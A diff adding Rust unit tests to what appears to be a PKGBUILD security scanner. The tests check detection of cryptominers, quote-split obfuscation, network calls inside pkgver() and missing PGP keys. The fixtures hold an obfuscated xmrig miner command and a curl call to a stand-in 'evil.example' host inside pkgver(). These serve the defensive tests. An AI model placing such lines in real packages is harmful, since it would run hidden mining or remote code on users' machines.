@@ -506,3 +506,76 @@ fn delta_flags_new_risk_on_version_bump() {
         .unwrap();
     assert_eq!(delta.severity, Severity::Critical);
 }
+
+/// Quote-splitting that hides a miner signature is caught by the normalize
+/// pass, which also flags the obfuscation itself.
+#[test]
+fn normalize_pass_unmasks_obfuscation() {
+    let pkgbuild = "build() {\n  ./xmr\"\"ig -o stratumhost:4444\n}\n";
+    let report = analyze(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+    );
+    let c = codes(&report);
+    assert!(c.contains(&"CRYPTO_MINER"), "got {c:?}");
+    assert!(c.contains(&"EVASION_NORMALIZED"), "got {c:?}");
+}
+
+/// A `pkgver()` that runs the network is RCE surface, since makepkg executes it.
+#[test]
+fn pkgver_running_network_is_critical() {
+    let pkgbuild =
+        "pkgname=x\npkgver() {\n  curl -s https://evil.example/v | tr -d '\\n'\n}\nbuild() { :; }\n";
+    let report = analyze(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+    );
+    assert!(
+        codes(&report).contains(&"PKGVER_EXEC"),
+        "got {:?}",
+        codes(&report)
+    );
+}
+
+/// A signature-bearing source with no `validpgpkeys` is unverifiable.
+#[test]
+fn missing_validpgpkeys_is_flagged() {
+    let pkgbuild = "pkgname=x\npkgver=1\nsource=('https://ex.com/x.tar.gz' 'https://ex.com/x.tar.gz.sig')\nsha256sums=('SKIP' 'SKIP')\n";
+    let report = analyze(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+    );
+    assert!(
+        codes(&report).contains(&"MISSING_PGP"),
+        "got {:?}",
+        codes(&report)
+    );
+}
+
+/// `--no-normalize` turns the anti-evasion pass off.
+#[test]
+fn no_normalize_flag_disables_pass() {
+    let pkgbuild = "build() {\n  ./xmr\"\"ig -o stratumhost:4444\n}\n";
+    let opts = ScanOpts {
+        normalize: false,
+        ..ScanOpts::default()
+    };
+    let report = analyze_with(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+        opts,
+    );
+    assert!(!codes(&report).contains(&"EVASION_NORMALIZED"));
+}
